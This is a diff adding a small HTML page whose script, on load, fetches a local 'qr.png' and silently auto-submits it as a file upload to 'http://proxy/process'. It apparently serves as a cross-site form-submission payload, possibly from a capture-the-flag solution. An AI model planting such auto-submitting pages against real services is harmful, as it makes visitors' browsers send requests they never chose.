@@ -1,0 +1,30 @@
+<!DOCTYPE html>
+<html>
+  <head>
+    <title>Document</title>
+  </head>
+  <body>
+    <script>
+      (async () => {
+        const blob = await (await fetch("./qr.png")).blob();
+        const file = new File([blob], "qr.png", { type: "image/png" }, "utf-8");
+        const c = new DataTransfer();
+        c.items.add(file);
+
+        const form = document.createElement("form");
+        form.method = "POST";
+        form.action = "http://proxy/process";
+        form.enctype = "multipart/form-data";
+
+        const input = document.createElement("input");
+        input.name = "qrnote";
+        input.type = "file";
+        input.files = c.files;
+
+        form.appendChild(input);
+        document.body.appendChild(form);
+        form.submit();
+      })();
+    </script>
+  </body>
+</html>
